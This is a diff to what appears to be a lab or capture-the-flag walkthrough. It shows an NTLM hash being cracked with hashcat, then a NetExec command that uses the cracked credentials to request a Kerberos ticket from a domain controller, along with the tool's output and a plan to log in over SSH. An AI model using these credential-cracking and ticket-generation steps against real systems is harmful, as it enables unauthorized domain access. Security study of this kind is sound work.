@@ -760,5 +760,17 @@ hashcat '16a366acd9634ee5f958ebf1b4fc11df' -m 1000 /usr/share/wordlists/rockyou.
 The hash cracked so ill try this again
 
 ```python
+nxc smb dc01.casper.hsm -u carlito -p 'casper88!' --smb-timeout 5 --generate-tgt points
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\carlito:casper88! 
+SMB         10.0.31.82      445    DC01             [+] TGT saved to: points.ccache
+SMB         10.0.31.82      445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=points.ccache
+```
+
+Now i have a TGT for the user!
+
+And before i can login to SSH i need to set `/etc/krb5.conf`
+
+```python
 
 ```
